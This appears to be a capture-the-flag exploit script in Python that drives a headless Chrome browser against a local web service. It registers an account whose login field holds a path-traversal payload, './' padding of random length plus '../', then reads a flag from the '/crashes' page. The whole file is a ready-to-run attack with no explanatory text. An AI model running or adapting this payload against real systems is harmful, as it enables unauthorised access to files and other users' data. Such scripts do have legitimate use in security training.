#!/usr/bin/python3.6
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import uuid
import time
import random

url = 'http://192.168.0.100:3335/'

options = webdriver.ChromeOptions()
options.add_argument('headless')
options.add_argument('window-size=1920x1080')
driver = webdriver.Chrome("/usr/lib/chromium-browser/chromedriver", chrome_options=options)
driver.get(url + 'register')

login = driver.find_element_by_name('login')

cnt = random.randint(5, 10)
padding = './' * cnt
u = 'gaeA0xdb'
login.send_keys(f'{padding}../{padding}{u}')

p = str(uuid.uuid4())
pwd = driver.find_element_by_name('password')
pwd.send_keys(p)

time.sleep(0.5)

pwd.send_keys(Keys.ENTER)

time.sleep(0.5)

driver.get(url + 'crashes')

time.sleep(0.5)

flag = driver.find_element_by_tag_name('p')
print(flag.text, flush=True)
